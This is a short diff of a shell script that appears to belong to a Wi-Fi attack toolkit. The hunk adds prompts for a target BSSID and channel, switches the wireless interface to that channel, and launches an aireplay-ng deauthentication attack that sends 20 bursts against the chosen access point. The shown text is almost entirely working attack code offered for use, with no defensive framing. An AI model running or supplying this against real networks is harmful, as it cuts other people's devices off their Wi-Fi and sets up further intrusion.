@@ -239,7 +239,23 @@ sleep 3
         echo -e "BSSID:"
         read bssid
 
-	xterm -hold -e "aireplay-ng -0 15 -a $bssid $interfaz" &
+	echo -e "Channel:"
+	read channel
+
+	echo -e $azul2 "You have to close the airodump window" $fincolor
+
+sleep 3
+	echo -e $rojo "Press intro to continue" $fincolor
+	read
+
+	ifconfig $interfaz down
+	sleep 1
+	iwconfig $interfaz channel $channel
+	sleep 1
+	ifconfig $interfaz up
+	sleep 1
+
+	xterm -e "aireplay-ng -0 20 -a $bssid $interfaz" &
 sleep 5
 
 ;;
